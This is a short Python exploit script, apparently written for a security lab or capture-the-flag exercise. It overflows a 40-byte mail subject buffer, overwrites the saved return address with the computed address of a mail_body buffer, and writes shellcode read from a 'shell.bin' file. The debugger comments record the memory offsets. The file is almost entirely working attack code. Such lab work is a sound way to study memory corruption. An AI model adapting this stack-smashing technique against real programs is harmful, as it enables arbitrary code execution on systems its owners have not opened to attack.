#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.flush()
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# read shellscript as bytestring, use writeBytes(payload) to write it out
with open("shell.bin", "rb") as f:
    payload = f.read()

# Here we have the address of the mutex struct.
pmutex = int(sys.stdin.readline(), 16)
mail_body = pmutex - 0x80

writeStr("A"*40)
writeLong(mail_body)
writeStr("\n")

#writeStr("Body\n")

writeBytes(payload)

#64 diff
#$1 = (pthread_mutex_t *) 0x40c0 <mutex>   
#$2 = (char (*)[128]) 0x4040 <mail_body>
#$3 = (pthread_cond_t *) 0x4100 <cond>

#mutex - mailbody = 128    0x80
#cond - mutex = 64         


#rip 0x7fffffffde90
# mail_subject = 0x7fffffffde40
# saved rip - mail_subject = 40   0x28